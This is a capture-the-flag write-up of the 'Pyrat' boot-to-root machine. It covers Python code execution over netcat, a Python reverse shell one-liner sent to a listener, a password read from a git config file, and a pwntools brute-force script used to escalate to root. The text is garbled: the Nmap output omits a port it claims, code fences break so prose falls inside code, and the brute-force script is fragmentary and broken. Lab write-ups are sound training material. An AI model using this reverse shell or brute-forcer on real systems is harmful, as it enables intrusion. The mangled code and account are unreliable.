Test your enumeration skills on this boot-to-root machine.

**Pyrat** is an Easy room that presents a unique challenge involving a Python-based HTTP server. At first glance, the server’s responses appear unusual, hinting at something more beneath the surface. Through careful testing and fuzzing, I uncover a critical Python code execution! This allows me to gain an initial foothold on the target machine.

---

## Nmap Scan
To begin, I performed an Nmap scan to identify open ports and services running on the target machine. This helps gather crucial information about potential entry points for exploitation.
````console
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

````
The scan revealed **two** open ports.
- Port 22 (SSH)
Service: OpenSSH 8.2p1 (Ubuntu 4ubuntu0.7)
Host Keys: RSA, ECDSA, ED25519
This suggests the system is running Ubuntu Linux, and SSH access might be useful later if valid credentials are found.

- Port 8000 (Python HTTP Server)
Service: SimpleHTTP/0.6 running on Python 3.11.2
The server responds with errors indicating that it may be executing Python code directly.
The fingerprint-strings output hints at potential command execution vulnerabilities, as it throws Python syntax errors when unexpected input is sent.

---
When I navigated to `http://pyrat.thm:8000`, the server responded with the message:
![trybasicconnection.png](Assets/Pictures/Pyrat/trybasicconnection.png)

After this i tried it with **curl**.
````console
curl http://pyrat.thm:8000/ -i
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Wed Feb 12 13:06:14  2025
Content-type: text/html; charset=utf-8
Content-Length: 27

Try a more basic connection
````
One detail that immediately caught my attention was the server banner.
`SimpleHTTP/0.6 Python/3.11.2`
This indicated that the service was running Python’s built-in HTTP server, but its behavior seemed unusual. The response body remained the same.
`Try a more basic connection`

This message suggested that the server might not be expecting a traditional browser-based request. Instead, it could be handling connections differently—perhaps requiring a raw or simplified client interaction.

---
## netcat
Given the nature of the server, I decided to test it using netcat (nc) to establish a more direct connection, & confirm whether the server was truly running a Python environment and executing user input dynamically, I conducted a simple test, I entered the following arithmetic operation.
````console
nc pyrat.thm 8000
print(4+4)
8
````
And sure enough, it returned the expected result, confirming that the server was executing Python code. With this, I realized that Code Execution, meaning i can leverage this to gain a foothold using a Python reverse shell payload.

To construct the **Python reverse shell**, I used the website [RevShells](https://www.revshells.com/), which provides a variety of pre-generated payloads for different environments. This allowed me to quickly generate a working **Python reverse shell**.

````plaintext
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
````
Ensuring a seamless connection back to my listener.

````bash
nc -lvnp 9999
listening on [any] 9999 ...
connect to [XX.XX.XX.XXX] from (UNKNOWN) [XX.XX.XXX.XX] 50544
bash: /root/.bashrc: Permission denied
www-data@Pyrat:~$ ls
````

With further digging, I discovered a password hidden within the `/opt/dev/.git/config` file.
````bash
www-data@Pyrat:~$ cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = [REDACTED]
````     
---
## SSH
Using the extracted password, I successfully established an SSH connection as the user think.

````bash   
ssh think@pyrat.thm
think@pyrat.thm's password:

````
Once inside, I navigated through the system files and captured the **user flag**, marking the first milestone. However, the root flag was still out of reach, requiring further privilege escalation to gain full control over the machine.

## Privilege Escalation
While exploring the user's emails, I stumbled upon an interesting message that caught my attention. The email referenced a **RAT** program running on the machine.

i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
````
Upon inspecting the running processes, I discovered `/root/pyrat.py`, which is most likely the RAT program mentioned in the email.
````bash

Returning to the Git repository and examining the commit history, I found that only a single commit.

Inspecting the changes made in the Git commit, I find a code from what appears to be an earlier version of the `pyrat.py` program.

Examining the code snippet & it's functions.
- Unknown input triggers an admin check; unauthorized sockets get downgraded.
- `shell` spawns an interactive shell for remote access.
- Other inputs run via `exec`, enabling arbitrary code execution.

Knowing this, we can craft a simple script to brute-force valid inputs and passwords using a wordlist.
````python
#!/usr/bin/env python3

    global valid_input
    context.log_level = "error"

    for word in wordlist:
        if stop_flag.is_set():
            return

        try:
            r = remote(target_ip, target_port, timeout=3)
            if mode == "input":
                r.sendline(word.encode())
                response = r.recvline(timeout=2)
                if b'not defined' not in response \
                and b'<string>' not in response and response.strip():
                    valid_input = word
                    stop_flag.set()
                    print(f"Valid input found: {word}")
            else:
                r.sendline(valid_input.encode())

                    stop_flag.set()
            r.close()
        except:
            pass

    for thread in threads: thread.join()

Running the script successfully reveals the valid input and password.

Now, using that valid input & password, i escalate the connection to root.
